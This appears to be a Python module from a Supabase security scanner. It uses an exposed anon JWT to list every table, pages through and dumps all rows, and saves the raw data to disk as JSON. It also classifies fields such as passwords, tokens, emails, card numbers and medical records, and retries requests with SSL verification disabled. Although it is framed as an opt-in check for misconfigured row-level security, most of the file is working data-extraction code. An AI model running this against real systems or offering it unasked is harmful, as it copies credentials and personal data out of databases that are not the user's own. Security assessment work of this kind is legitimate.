"""
deep_scanner.py
---------------
Deep-mode scanner: uses an exposed JWT to enumerate tables and assess
what data is accessible via the misconfigured RLS.

Only runs when the user explicitly passes --mode deep AND confirms the prompt.
Requires a valid Supabase URL + anon JWT discovered during passive scanning.
"""

import json
import os
import re
from dataclasses import dataclass, field, asdict

import aiohttp

# ---------------------------------------------------------------------------
# Sensitive / non-sensitive field classifiers (ported from sup-detector.py)
# ---------------------------------------------------------------------------

SENSITIVE_FIELD_PATTERNS: list[str] = [
    # Auth & credentials
    r'\bpassword\b', r'\bpasswd\b', r'\bpwd\b', r'\bpass\b',
    r'\bapi[_-]?key\b', r'\bapikey\b', r'\bsecret\b', r'\bprivate[_-]?key\b',
    r'\btoken\b', r'\bjwt\b', r'\baccess[_-]?token\b', r'\brefresh[_-]?token\b',
    r'\bsession[_-]?token\b', r'\bbearer[_-]?token\b',
    r'\botp\b', r'\b2fa[_-]?secret\b',
    # PII
    r'\bphone\b', r'\bphone[_-]?number\b', r'\bmobile\b',
    r'\bssn\b', r'\bsocial[_-]?security\b',
    r'\bpassport[_-]?number\b', r'\bnational[_-]?id\b', r'\btax[_-]?id\b',
    r'\buser[_-]?id\b', r'\bcustomer[_-]?id\b', r'\bemployee[_-]?id\b',
    r'\bemail\b',
    # Financial
    r'\bcredit[_-]?card\b', r'\bcvv\b', r'\bcvc\b',
    r'\bbank[_-]?account\b', r'\biban\b', r'\brouting[_-]?number\b',
    r'\bsalary\b', r'\bincome\b', r'\bpayroll\b',
    # Location
    r'\bip[_-]?address\b', r'\bipv4\b', r'\bipv6\b',
    r'\blatitude\b', r'\blongitude\b',
    # Medical
    r'\bhealth[_-]?record\b', r'\bmedical[_-]?record\b', r'\bpatient[_-]?id\b',
    r'\bdiagnosis\b',
    # Device
    r'\bdevice[_-]?id\b', r'\bmac[_-]?address\b', r'\bimei\b',
    # Internal
    r'\bconfidential\b', r'\badmin[_-]?note\b',
]

NON_SENSITIVE_FIELDS: list[str] = [
    r'\bcreated[_-]?at\b', r'\bupdated[_-]?at\b', r'\bdeleted[_-]?at\b',
    r'^id$', r'\bdescription\b', r'\btitle\b', r'\bname\b', r'\bcontent\b',
    r'\bcreator\b', r'\bauthor\b', r'\blinks?\b', r'\burl\b',
    r'\bimage\b', r'\bavatar\b', r'\bsearch[_-]?vector\b',
]

EMAIL_RE    = re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
PHONE_RE    = re.compile(r'[\+]?[(]?[0-9]{1,4}[)]?[-\s\.]?[(]?[0-9]{1,4}[)]?[-\s\.]?[0-9]{1,9}')
CC_RE       = re.compile(r'\b(?:\d{4}[-\s]?){3}\d{4}\b')
JWT_VAL_RE  = re.compile(r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')

HIGH_SEVERITY = [
    r'password', r'passwd', r'pwd', r'secret',
    r'api[_-]?key', r'token', r'jwt', r'credit[_-]?card', r'ssn',
]

PAGE_SIZE = 1000


# ---------------------------------------------------------------------------
# Data models
# ---------------------------------------------------------------------------

@dataclass
class TableAnalysis:
    table: str
    accessible: bool
    http_status: int | str
    row_count: int = 0
    sensitive_fields: list[str] = field(default_factory=list)
    vulnerability_level: str = "none"   # none | medium | high | critical
    field_details: dict = field(default_factory=dict)

    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class DeepScanResult:
    supabase_url: str
    jwt_used: str
    tables_found: int = 0
    tables_accessible: int = 0
    table_results: list[TableAnalysis] = field(default_factory=list)
    errors: list[str] = field(default_factory=list)

    @property
    def vulnerable_tables(self) -> list[TableAnalysis]:
        return [t for t in self.table_results if t.sensitive_fields]

    @property
    def overall_level(self) -> str:
        levels = [t.vulnerability_level for t in self.table_results]
        for lvl in ("critical", "high", "medium"):
            if lvl in levels:
                return lvl
        return "none"

    def to_dict(self) -> dict:
        d = asdict(self)
        d["table_results"] = [t.to_dict() for t in self.table_results]
        return d


# ---------------------------------------------------------------------------
# Field sensitivity helpers
# ---------------------------------------------------------------------------

def _is_non_sensitive(field_name: str) -> bool:
    fl = field_name.lower()
    return any(re.search(p, fl) for p in NON_SENSITIVE_FIELDS)


def _is_sensitive_name(field_name: str) -> bool:
    if _is_non_sensitive(field_name):
        return False
    fl = field_name.lower()
    return any(re.search(p, fl) for p in SENSITIVE_FIELD_PATTERNS)


def analyze_rows(rows: list[dict], max_samples: int = 100) -> TableAnalysis | None:
    """
    Inspect up to `max_samples` rows and classify each field.
    Returns a partial TableAnalysis (caller fills table name / http status).
    """
    if not rows or not isinstance(rows[0], dict):
        return None

    sample = rows[:max_samples]
    sensitive: list[str] = []
    details: dict = {}

    for fname in sample[0].keys():
        fl = fname.lower()
        if _is_non_sensitive(fname):
            continue

        reasons: list[str] = []
        if _is_sensitive_name(fname):
            reasons.append("field_name")

        # Value-level patterns — check up to 10 non-null values
        vals = [str(r[fname]) for r in sample if r.get(fname) is not None][:10]
        for v in vals:
            if EMAIL_RE.search(v) and "email" in fl and "email_pattern" not in reasons:
                reasons.append("email_pattern")
            if (PHONE_RE.search(v)
                    and len(re.sub(r'[\s\-\(\)]', '', v)) >= 10
                    and ("phone" in fl or "mobile" in fl)
                    and "phone_pattern" not in reasons):
                reasons.append("phone_pattern")
            if JWT_VAL_RE.search(v) and "jwt_pattern" not in reasons:
                reasons.append("jwt_pattern")
            if CC_RE.search(v) and "cc_pattern" not in reasons:
                reasons.append("cc_pattern")

        if reasons:
            sensitive.append(fname)
            details[fname] = {"reasons": reasons, "sample_count": len(vals)}

    # Determine severity
    level = "none"
    if sensitive:
        if any(re.search(p, f.lower()) for f in sensitive for p in HIGH_SEVERITY):
            level = "critical"
        elif any(
            "email_pattern" in d["reasons"] or "phone_pattern" in d["reasons"]
            for d in details.values()
        ):
            level = "high"
        else:
            level = "medium"

    result = TableAnalysis(
        table="",
        accessible=True,
        http_status=200,
        row_count=len(rows),
        sensitive_fields=sensitive,
        vulnerability_level=level,
        field_details=details,
    )
    return result


# ---------------------------------------------------------------------------
# Supabase REST helpers
# ---------------------------------------------------------------------------

async def _safe_get(
    session: aiohttp.ClientSession,
    url: str,
    headers: dict,
    timeout: int = 10,
) -> tuple[int, str | None]:
    """Returns (status_code, text) or (0, None) on network error."""
    to = aiohttp.ClientTimeout(total=timeout)
    for ssl_val in (True, False):
        try:
            async with session.get(url, headers=headers, timeout=to, ssl=ssl_val) as r:
                return r.status, await r.text(errors="replace")
        except aiohttp.ClientSSLError:
            continue  # retry without SSL verification
        except Exception:
            return 0, None
    return 0, None


async def enumerate_tables(
    session: aiohttp.ClientSession,
    base_url: str,
    jwt: str,
) -> list[str]:
    headers = {"apikey": jwt, "Authorization": f"Bearer {jwt}"}
    status, text = await _safe_get(session, f"{base_url}/rest/v1/", headers)

    if status != 200 or not text:
        raise RuntimeError(f"Table enumeration failed (HTTP {status})")

    data = json.loads(text)
    return [
        p.strip("/")
        for p in data.get("paths", {})
        if not p.startswith("/rpc") and p != "/"
    ]


async def dump_table(
    session: aiohttp.ClientSession,
    base_url: str,
    table: str,
    jwt: str,
) -> tuple[list[dict], int]:
    headers = {
        "apikey": jwt,
        "Authorization": f"Bearer {jwt}",
        "Range-Unit": "items",
    }
    rows: list[dict] = []
    offset = 0

    while True:
        url = f"{base_url}/rest/v1/{table}?limit={PAGE_SIZE}&offset={offset}"
        status, text = await _safe_get(session, url, headers)

        if status != 200 or not text:
            return rows, status or 0

        chunk: list = json.loads(text)
        rows.extend(chunk)
        if len(chunk) < PAGE_SIZE:
            break
        offset += PAGE_SIZE

    return rows, 200


# ---------------------------------------------------------------------------
# Orchestrator
# ---------------------------------------------------------------------------

async def run_deep_scan(
    session: aiohttp.ClientSession,
    supabase_url: str,
    jwt: str,
    output_dir: str,
) -> DeepScanResult:
    result = DeepScanResult(supabase_url=supabase_url, jwt_used=f"{jwt[:30]}...")

    # Per-target output directory
    domain = supabase_url.split("//")[-1].split(".")[0]
    target_dir = os.path.join(output_dir, domain, "tables")
    os.makedirs(target_dir, exist_ok=True)

    # 1. Enumerate tables
    try:
        tables = await enumerate_tables(session, supabase_url, jwt)
    except RuntimeError as e:
        result.errors.append(str(e))
        return result

    result.tables_found = len(tables)

    # 2. Dump + analyse each table
    import asyncio
    dump_tasks = [dump_table(session, supabase_url, t, jwt) for t in tables]
    dump_results = await asyncio.gather(*dump_tasks, return_exceptions=True)

    for table, dump in zip(tables, dump_results):
        if isinstance(dump, Exception):
            result.table_results.append(
                TableAnalysis(table=table, accessible=False, http_status="EXC")
            )
            result.errors.append(f"{table}: {dump}")
            continue

        rows, status = dump
        ta = TableAnalysis(table=table, accessible=(status == 200), http_status=status)

        if status == 200 and rows:
            result.tables_accessible += 1
            analysis = analyze_rows(rows)
            if analysis:
                ta.row_count          = analysis.row_count
                ta.sensitive_fields   = analysis.sensitive_fields
                ta.vulnerability_level = analysis.vulnerability_level
                ta.field_details      = analysis.field_details

            # Save raw dump
            out_path = os.path.join(target_dir, f"{table}.json")
            with open(out_path, "w") as fh:
                json.dump(rows, fh, indent=2)

        result.table_results.append(ta)

    # 3. Save summary
    summary_path = os.path.join(output_dir, domain, "deep_summary.json")
    with open(summary_path, "w") as fh:
        json.dump(result.to_dict(), fh, indent=2)

    return result